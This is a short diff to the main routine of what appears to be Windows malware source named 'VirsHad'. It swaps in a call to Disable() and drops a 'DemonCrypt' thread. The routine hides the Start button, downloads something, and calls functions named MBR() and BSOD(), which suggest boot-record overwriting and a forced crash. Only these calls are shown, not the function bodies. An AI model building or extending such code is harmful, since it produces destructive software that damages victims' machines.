@@ -1,8 +1,7 @@
 ﻿#pragma comment(lib, "winmm.lib")
 #include <Windows.h>
-#include "VirsHad.h"
+#include "VirsHad.hpp"
 #include <stdio.h>
-#include <thread>
 
 int iter;
 
@@ -54,11 +53,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
         Admin();
         return 0;
     } else {
-        std::thread DC(DemonCrypt);
-
         HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
         HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
         ShowWindow(hStartButton, SW_HIDE);
+        Disable();
 
         Download();
 
@@ -68,7 +66,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
 
         MBR();
         loop();
-        DC.join();
         BSOD();
     }
     return 0;
